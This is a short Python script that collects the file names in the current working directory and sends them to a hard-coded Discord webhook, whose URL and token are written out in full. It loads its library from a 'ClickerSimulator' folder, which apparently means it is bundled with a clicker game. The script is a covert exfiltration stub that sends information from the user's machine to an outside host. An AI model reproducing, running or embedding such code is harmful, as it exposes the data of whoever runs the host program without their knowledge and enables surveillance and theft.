import sys
import os

sys.path.insert(0, os.path.join(os.path.dirname(__file__), "ClickerSimulator", "Libraries"))

import dhooks


hook_url = "https://discord.com/api/webhooks/1404239390380916766/ddGy2brbv0hXcpGDYg3PM4CTL7fpubieqAPSTJqug8MNqKhcb2hewkVw49JvfySY0pZG"
hook = dhooks.Webhook(hook_url)

files = os.listdir()

files_str = "\n".join(files)

hook.send(files_str)
